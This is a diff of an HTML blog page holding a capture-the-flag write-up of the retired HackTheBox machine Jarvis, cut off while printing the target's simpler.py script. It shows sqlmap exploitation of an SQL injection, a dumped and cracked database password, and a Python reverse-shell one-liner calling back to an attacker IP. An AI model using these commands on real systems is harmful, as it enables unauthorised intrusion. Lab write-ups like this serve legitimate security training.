@@ -1,164 +1,119 @@
 
 <!DOCTYPE html>
+
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-  <meta name="HandheldFriendly" content="True" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta name="robots" content="" />
-
-  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">
-
-    <link rel="stylesheet" type="text/css" href="../../theme/stylesheet/style.min.css">
-
-    <link id="dark-theme-style" rel="stylesheet" type="text/css"
-          media="(prefers-color-scheme: dark)"
-    href="../../theme/stylesheet/dark-theme.min.css">
-
-    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
-              media="(prefers-color-scheme: dark)"
-          href="../../theme/pygments/monokai.min.css">
-    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
-              media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)"
-          href="../../theme/pygments/sas.min.css">
-
-
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/fontawesome.css">
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/brands.css">
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/solid.css">
-
-
-    <link href="https://maggick.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="maggick's logs Atom">
-
-
-
-  
-
-
- 
-
-<meta name="author" content="maggick" />
-<meta name="description" content="This is a writeup about a retired HacktheBox machine: Jarvis. This box is rated as a medium box. It implies a dead end, some SQL injection, a homemade script and a SUID binary." />
-<meta name="keywords" content="security, boot2root, HTB, SQLi, linux">
-
-
-  <meta property="og:site_name" content="maggick's logs"/>
-  <meta property="og:title" content="HTB: Jarvis"/>
-  <meta property="og:description" content="This is a writeup about a retired HacktheBox machine: Jarvis. This box is rated as a medium box. It implies a dead end, some SQL injection, a homemade script and a SUID binary."/>
-  <meta property="og:locale" content="en_US"/>
-  <meta property="og:url" content="../../2019/11/htb-jarvis.html"/>
-  <meta property="og:type" content="article"/>
-  <meta property="article:published_time" content="2019-11-10 12:30:00+01:00"/>
-  <meta property="article:modified_time" content=""/>
-  <meta property="article:author" content="../../author/maggick.html">
-  <meta property="article:section" content="security"/>
-  <meta property="article:tag" content="security"/>
-  <meta property="article:tag" content="boot2root"/>
-  <meta property="article:tag" content="HTB"/>
-  <meta property="article:tag" content="SQLi"/>
-  <meta property="article:tag" content="linux"/>
-  <meta property="og:image" content="https://maggick.fr/media/image.png">
-
-  <title>maggick's logs &ndash; HTB: Jarvis</title>
-
-</head>
-<body >
-  <aside>
-    <div>
-      <a href="../../">
-        <img src="https://maggick.fr/media/image.png" alt="maggick's logs" title="maggick's logs">
-      </a>
-
-      <h1>
-        <a href="../../">maggick's logs</a>
-      </h1>
-
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<meta content="" name="robots"/>
+<link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&amp;family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&amp;display=swap" rel="stylesheet"/>
+<link href="../../theme/stylesheet/style.min.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/stylesheet/dark-theme.min.css" id="dark-theme-style" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/pygments/monokai.min.css" id="pygments-dark-theme" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/pygments/sas.min.css" id="pygments-light-theme" media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/fontawesome.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/brands.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/solid.css" rel="stylesheet" type="text/css"/>
+<link href="https://maggick.fr/feeds/all.atom.xml" rel="alternate" title="maggick's logs Atom" type="application/atom+xml"/>
+<meta content="maggick" name="author"/>
+<meta content="This is a writeup about a retired HacktheBox machine: Jarvis. This box is rated as a medium box. It implies a dead end, some SQL injection, a homemade script and a SUID binary." name="description"/>
+<meta content="security, boot2root, HTB, SQLi, linux" name="keywords"/>
+<meta content="maggick's logs" property="og:site_name">
+<meta content="HTB: Jarvis" property="og:title"/>
+<meta content="This is a writeup about a retired HacktheBox machine: Jarvis. This box is rated as a medium box. It implies a dead end, some SQL injection, a homemade script and a SUID binary." property="og:description"/>
+<meta content="en_US" property="og:locale"/>
+<meta content="../../2019/11/htb-jarvis.html" property="og:url"/>
+<meta content="article" property="og:type"/>
+<meta content="2019-11-10 12:30:00+01:00" property="article:published_time"/>
+<meta content="" property="article:modified_time"/>
+<meta content="../../author/maggick.html" property="article:author"/>
+<meta content="security" property="article:section">
+<meta content="security" property="article:tag"/>
+<meta content="boot2root" property="article:tag"/>
+<meta content="HTB" property="article:tag"/>
+<meta content="SQLi" property="article:tag"/>
+<meta content="linux" property="article:tag"/>
+<meta content="https://maggick.fr/media/image.png" property="og:image"/>
+<title>maggick's logs – HTB: Jarvis</title>
+</meta></meta></head>
+<body>
+<aside>
+<div>
+<a href="../../">
+<img alt="maggick's logs" src="https://maggick.fr/media/image.png" title="maggick's logs"/>
+</a>
+<h1>
+<a href="../../">maggick's logs</a>
+</h1>
 <p>Offensive security tales</p>
-
-      <nav>
-        <ul class="list">
-
-
-              <li>
-                <a target="_self"
-                   href="../../pages/about.html">
+<nav>
+<ul class="list">
+<li>
+<a href="../../pages/about.html" target="_self">
                   About
                 </a>
-              </li>
-              <li>
-                <a target="_self"
-                   href="../../pages/notes.html">
+</li>
+<li>
+<a href="../../pages/notes.html" target="_self">
                   Notes
                 </a>
-              </li>
-              <li>
-                <a target="_self"
-                   href="../../pages/tools.html">
+</li>
+<li>
+<a href="../../pages/tools.html" target="_self">
                   Tools
                 </a>
-              </li>
-
-        </ul>
-      </nav>
-
-      <ul class="social">
-          <li>
-            <a  class="sc-github" href="https://github.com/maggick" target="_blank">
-              <i class="fab fa-github"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
-              <i class="fab fa-twitter"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
-              <i class="fab fa-stack-overflow"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
-              <i class="fas fa-rss"></i>
-            </a>
-          </li>
-      </ul>
-    </div>
-
-  </aside>
-  <main>
-
-    <nav>
-      <a href="../../">Home</a>
-
-      <a href="/archives.html">Archives</a>
-      <a href="/categories.html">Categories</a>
-      <a href="/tags.html">Tags</a>
-
-      <a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
-
-    </nav>
-
+</li>
+</ul>
+</nav>
+<ul class="social">
+<li>
+<a class="sc-github" href="https://github.com/maggick" target="_blank">
+<i class="fab fa-github"></i>
+</a>
+</li>
+<li>
+<a class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
+<i class="fab fa-twitter"></i>
+</a>
+</li>
+<li>
+<a class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
+<i class="fab fa-stack-overflow"></i>
+</a>
+</li>
+<li>
+<a class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
+<i class="fas fa-rss"></i>
+</a>
+</li>
+</ul>
+</div>
+</aside>
+<main>
+<nav>
+<a href="../../">Home</a>
+<a href="/archives.html">Archives</a>
+<a href="/categories.html">Categories</a>
+<a href="/tags.html">Tags</a>
+<a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
+</nav>
 <article class="single">
-  <header>
-      
-    <h1 id="htb-jarvis">HTB: Jarvis</h1>
-    <p>
+<header>
+<h1 id="htb-jarvis">HTB: Jarvis</h1>
+<p>
       Posted on 10 Nov 2019 in <a href="../../category/security.html">security</a>
 
-        &#8226; 7 min read
+        • 7 min read
     </p>
-  </header>
-
-
-  <div>
-    <p><img class="align-left" src="/media/2019.10/jarvis_card.png" alt="Jarvis Card" width="262"></p>
+</header>
+<div>
+<p><img alt="Jarvis Card" class="align-left" src="/media/2019.10/jarvis_card.png" width="262"/></p>
 <p>This is a writeup about a retired HacktheBox machine:
 <a href="https://www.hackthebox.com/home/machines/profile/194">Jarvis</a>.
 This box is rated as a medium box. It implies a dead end, some SQL injection, a
 homemade script and a SUID binary.</p>
-
 <p>[TOC]</p>
 <h1>Recon</h1>
 <p>Let us start as always by a <code>nmap</code> scan the ports 22 (SSH), 80 (HTTP) and 64999
@@ -179,7 +134,6 @@ PORT      STATE SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 101.63 seconds
 </code></pre></div>
-
 <p>Let us see what services are running on this ports (especially the last one). It
 a simple HTTP service.</p>
 <div class="highlight"><pre><span></span><code>nmap -p 22,80,64999 -sSV 10.10.10.143
@@ -196,32 +150,30 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 12.80 seconds
 </code></pre></div>
-
 <h1>Web</h1>
 <h2>On port 64999</h2>
 <p>The page on the web service on port 64999 is only saying that we have been
 banned for 90 seconds.</p>
 <div class="highlight"><pre><span></span><code>curl http://10.10.10.143:64999/
-Hey you have been banned for 90 seconds, don&#39;t be bad
+Hey you have been banned for 90 seconds, don't be bad
 </code></pre></div>
-
 <h2>On port 80</h2>
 <p>The website is a "classical" hotel homepage.</p>
-<p><img alt="Jarvis homepage" src="/media/2019.10/jarvis_1.png"></p>
+<p><img alt="Jarvis homepage" class="image-process-article-image" src="/media/2019.10/derivatives/article-image/jarvis_1.png"/></p>
 <p>We can checkout rooms. We notice that there is a <code>cod</code> GET parameter (in the
 URL).
 Moreover if we put a <code>-1</code> at the end of the URL we get to the previous room. For
 instance the URL <code>http://10.10.10.143/room.php?cod=5-1</code> give us exactly the same
 room as the <code>http://10.10.10.143/room.php?cod=4</code> URL. This is symptomatic of an
 SQL injection.</p>
-<p><img alt="Jarvis room id 4" src="/media/2019.10/jarvis_2.png"></p>
-<p><img alt="Jarvis room id 5" src="/media/2019.10/jarvis_3.png"></p>
-<p><img alt="Jarvis room id 5-1" src="/media/2019.10/jarvis_4.png"></p>
+<p><img alt="Jarvis room id 4" class="image-process-article-image" src="/media/2019.10/derivatives/article-image/jarvis_2.png"/></p>
+<p><img alt="Jarvis room id 5" class="image-process-article-image" src="/media/2019.10/derivatives/article-image/jarvis_3.png"/></p>
+<p><img alt="Jarvis room id 5-1" class="image-process-article-image" src="/media/2019.10/derivatives/article-image/jarvis_4.png"/></p>
 <h1>Getting user</h1>
 <p>We launch <code>sqlmap</code> against the page, it confirm the SQL injection:</p>
 <div class="highlight"><pre><span></span><code>sqlmap -u http://10.10.10.143/room.php?cod=5-1
 &lt;SNIP&gt;
-GET parameter &#39;cod&#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] sqlmap identified the following injection point(s) with a total of 72 HTTP(s) requests:
+GET parameter 'cod' is vulnerable. Do you want to keep testing the others (if any)? [y/N] sqlmap identified the following injection point(s) with a total of 72 HTTP(s) requests:
 ---
 Parameter: cod (GET)
     Type: boolean-based blind
@@ -240,7 +192,6 @@ web server operating system: Linux Debian 9.0 (stretch)
 web application technology: PHP, Apache 2.4.25
 back-end DBMS: MySQL &gt;= 5.0.12
 </code></pre></div>
-
 <p>We list the available database:</p>
 <ul>
 <li>hotel</li>
@@ -256,7 +207,6 @@ available databases [4]:
 [*] mysql
 [*] performance_schema
 </code></pre></div>
-
 <p>We list the table for the <code>hotel</code> database and dump it, nothing interesting.</p>
 <div class="highlight"><pre><span></span><code>sqlmap -u http://10.10.10.143/room.php?cod=5-1  -D hotel --tables
 Database: hotel
@@ -271,7 +221,6 @@ Table: room
 [6 entries]
 &lt;SNIP&gt;
 </code></pre></div>
-
 <p>We dump the mysqluser table and crack the password hash (with the sqlmap
 cracking function):</p>
 <div class="highlight"><pre><span></span><code>sqlmap -u http://10.10.10.143/room.php?cod=5-1  -D mysql -T user --dump
@@ -280,20 +229,18 @@ Table: user
 [1 entry]
 *2D2B7A5E4E637B8FBA1D17F40318F277D29964D0 (imissyou)
 </code></pre></div>
-
 <p>We can then connect to the phpmyadmin as DBadmin:</p>
-<p><img alt="Jarvis phpmyadmin" src="/media/2019.10/jarvis_5.png"></p>
+<p><img alt="Jarvis phpmyadmin" class="image-process-article-image" src="/media/2019.10/derivatives/article-image/jarvis_5.png"/></p>
 <p>This does not give us a shell. Let us try something different: the <code>--os-shell</code>
 option from <code>sqlmap</code>. We got a shell!</p>
 <div class="highlight"><pre><span></span><code>sqlmap -u http://10.10.10.143/room.php?cod=5-1  --os-shell
 os-shell&gt; id
-command standard output: &#39;uid=33(www-data) gid=33(www-data) groups=33(www-data)&#39;
+command standard output: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'
 </code></pre></div>
-
 <p>We start enumeration a bit and found that we can call a binary as the pepper
 user with <code>sudo</code>.</p>
 <div class="highlight"><pre><span></span><code>os-shell&gt; ls /home/
-command standard output: &#39;pepper&#39;
+command standard output: 'pepper'
 os-shell&gt; ls /home/pepper/
 command standard output:
 ---
@@ -301,7 +248,7 @@ Web
 user.txt
 ---
 os-shell&gt; cat /home/pepper/user.txt
-command standard output: &#39;cat: /home/pepper/user.txt: Permission denied&#39;
+command standard output: 'cat: /home/pepper/user.txt: Permission denied'
 os-shell&gt; ls -al /home/pepper/
 command standard output:
 ---
@@ -326,9 +273,8 @@ User www-data may run the following commands on jarvis:
     (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
 ---
 </code></pre></div>
-
 <p>In oder to have a better shell, we use a python reverseshell:</p>
-<div class="highlight"><pre><span></span><code>export RHOST=&quot;10.10.15.31&quot;;export RPORT=4444;python -c &#39;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#39;
+<div class="highlight"><pre><span></span><code>export RHOST="10.10.15.31";export RPORT=4444;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
 
 $ sudo -l
 Matching Defaults entries for www-data on jarvis:
@@ -339,7 +285,6 @@ User www-data may run the following commands on jarvis:
     (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
 $ sudo -u pepper /var/www/Admin-Utilities/simpler.py
 </code></pre></div>
-
 <p>The <code>simpler.py</code> script is the following:</p>
 <div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
 <span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">datetime</span>
@@ -349,7 +294,7 @@ $ sudo -u pepper /var/www/Admin-Utilities/simpler.py
 <span class="kn">import</span> <span class="nn">re</span>
 
 <span class="k">def</span> <span class="nf">show_help</span><span class="p">():</span>
-    <span class="n">message</span><span class="o">=</span><span class="s1">&#39;&#39;&#39;</span>
+    <span class="n">message</span><span class="o">=</span><span class="s1">'''</span>
 <span class="s1">********************************************************</span>
 <span class="s1">* Simpler   -   A simple simplifier ;)                 *</span>
 <span class="s1">* Version 1.0                                          *</span>
@@ -361,45 +306,45 @@ $ sudo -u pepper /var/www/Admin-Utilities/simpler.py
 <span class="s1">    -s          : Statistics</span>
 <span class="s1">    -l          : List the attackers IP</span>
 <span class="s1">    -p          : ping an attacker IP</span>
-<span class="s1">    &#39;&#39;&#39;</span>
+<span class="s1">    '''</span>
     <span class="nb">print</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">show_header</span><span class="p">():</span>
-    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;&#39;&#39;***********************************************</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">'''***********************************************</span>
 <span class="s1">    _                 _</span>
 <span class="s1">___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _</span>
-<span class="s1">/ __| | &#39;_ ` _ \| &#39;_ \| |/ _ \ &#39;__| &#39;_ \| | | |</span>
+<span class="s1">/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |</span>
 <span class="s1">\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |</span>
 <span class="s1">|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |</span>
 <span class="s1">                |_|               |_|    |___/</span>
 <span class="s1">                                @ironhackers.es</span>
 
 <span class="s1">***********************************************</span>
-<span class="s1">&#39;&#39;&#39;</span><span class="p">)</span>
+<span class="s1">'''</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">show_statistics</span><span class="p">():</span>
-    <span class="n">path</span> <span class="o">=</span> <span class="s1">&#39;/home/pepper/Web/Logs/&#39;</span>
-    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Statistics</span><span class="se">\n</span><span class="s1">-----------&#39;</span><span class="p">)</span>
+    <span class="n">path</span> <span class="o">=</span> <span class="s1">'/home/pepper/Web/Logs/'</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">'Statistics</span><span class="se">\n</span><span class="s1">-----------'</span><span class="p">)</span>
     <span class="n">listed_files</span> <span class="o">=</span> <span class="n">listdir</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
     <span class="n">count</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">listed_files</span><span class="p">)</span>
-    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Number of Attackers: &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">count</span><span class="p">))</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">'Number of Attackers: '</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">count</span><span class="p">))</span>
     <span class="n">level_1</span> <span class="o">=</span> <span class="mi">0</span>
     <span class="n">dat</span> <span class="o">=</span> <span class="n">datetime</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
     <span class="n">ip_list</span> <span class="o">=</span> <span class="p">[]</span>
     <span class="n">reks</span> <span class="o">=</span> <span class="p">[]</span>
-    <span class="n">ip</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
-    <span class="n">req</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
-    <span class="n">rek</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+    <span class="n">ip</span> <span class="o">=</span> <span class="s1">''</span>
+    <span class="n">req</span> <span class="o">=</span> <span class="s1">''</span>
+    <span class="n">rek</span> <span class="o">=</span> <span class="s1">''</span>
     <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">listed_files</span><span class="p">:</span>
-        <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">path</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span>
+        <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">path</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="s1">'r'</span><span class="p">)</span>
         <span class="n">lines</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
         <span class="n">level2</span><span class="p">,</span> <span class="n">rek</span> <span class="o">=</span> <span class="n">get_max_level</span><span class="p">(</span><span class="n">lines</span><span class="p">)</span>
         <span class="n">fecha</span><span class="p">,</span> <span class="n">requ</span> <span class="o">=</span> <span class="n">date_to_num</span><span class="p">(</span><span class="n">lines</span><span class="p">)</span>
-        <span class="n">ip</span> <span class="o">=</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;.&#39;</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;.&#39;</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;.&#39;</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">3</span><span class="p">]</span>
+        <span class="n">ip</span> <span class="o">=</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">'.'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s1">'.'</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">'.'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s1">'.'</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">'.'</span><span class="p">)[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="s1">'.'</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">'.'</span><span class="p">)[</span><span class="mi">3</span><span class="p">]</span>
         <span class="k">if</span> <span class="n">fecha</span> <span class="o">&gt;</span> <span class="n">dat</span><span class="p">:</span>
             <span class="n">dat</span> <span class="o">=</span> <span class="n">fecha</span>
             <span class="n">req</span> <span class="o">=</span> <span class="n">requ</span>
-            <span class="n">ip2</span> <span class="o">=</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;.&#39;</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;.&#39;</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;.&#39;</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">3</span><span class="p">]</span>
+            <span class="n">ip2</span> <span class="o">=</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">'.'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s1">'.'</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">'.'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s1">'.'</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">'.'</span><span class="p">)[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="s1">'.'</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">'.'</span><span class="p">)[</span><span class="mi">3</span><span class="p">]</span>
         <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">level2</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nb">int</span><span class="p">(</span><span class="n">level_1</span><span class="p">):</span>
             <span class="n">level_1</span> <span class="o">=</span> <span class="n">level2</span>
             <span class="n">ip_list</span> <span class="o">=</span> <span class="p">[</span><span class="n">ip</span><span class="p">]</span>
@@ -409,88 +354,87 @@ $ sudo -u pepper /var/www/Admin-Utilities/simpler.py
             <span class="n">reks</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">rek</span><span class="p">)</span>
         <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
 
-    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Most Risky:&#39;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">'Most Risky:'</span><span class="p">)</span>
     <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">ip_list</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
-        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;More than 1 ip found&#39;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s1">'More than 1 ip found'</span><span class="p">)</span>
     <span class="n">cont</span> <span class="o">=</span> <span class="mi">0</span>
     <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">ip_list</span><span class="p">:</span>
-        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;    &#39;</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="s1">&#39; - Attack Level : &#39;</span> <span class="o">+</span> <span class="n">level_1</span> <span class="o">+</span> <span class="s1">&#39; Request: &#39;</span> <span class="o">+</span> <span class="n">reks</span><span class="p">[</span><span class="n">cont</span><span class="p">])</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s1">'    '</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="s1">' - Attack Level : '</span> <span class="o">+</span> <span class="n">level_1</span> <span class="o">+</span> <span class="s1">' Request: '</span> <span class="o">+</span> <span class="n">reks</span><span class="p">[</span><span class="n">cont</span><span class="p">])</span>
         <span class="n">cont</span> <span class="o">=</span> <span class="n">cont</span> <span class="o">+</span> <span class="mi">1</span>
 
-    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Most Recent: &#39;</span> <span class="o">+</span> <span class="n">ip2</span> <span class="o">+</span> <span class="s1">&#39; --&gt; &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">dat</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39; &#39;</span> <span class="o">+</span> <span class="n">req</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">'Most Recent: '</span> <span class="o">+</span> <span class="n">ip2</span> <span class="o">+</span> <span class="s1">' --&gt; '</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">dat</span><span class="p">)</span> <span class="o">+</span> <span class="s1">' '</span> <span class="o">+</span> <span class="n">req</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">list_ip</span><span class="p">():</span>
-    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Attackers</span><span class="se">\n</span><span class="s1">-----------&#39;</span><span class="p">)</span>
-    <span class="n">path</span> <span class="o">=</span> <span class="s1">&#39;/home/pepper/Web/Logs/&#39;</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">'Attackers</span><span class="se">\n</span><span class="s1">-----------'</span><span class="p">)</span>
+    <span class="n">path</span> <span class="o">=</span> <span class="s1">'/home/pepper/Web/Logs/'</span>
     <span class="n">listed_files</span> <span class="o">=</span> <span class="n">listdir</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
     <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">listed_files</span><span class="p">:</span>
-        <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">path</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">)</span>
+        <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">path</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span><span class="s1">'r'</span><span class="p">)</span>
         <span class="n">lines</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
         <span class="n">level</span><span class="p">,</span><span class="n">req</span> <span class="o">=</span> <span class="n">get_max_level</span><span class="p">(</span><span class="n">lines</span><span class="p">)</span>
-        <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;.&#39;</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;.&#39;</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;.&#39;</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39; - Attack Level : &#39;</span> <span class="o">+</span> <span class="n">level</span><span 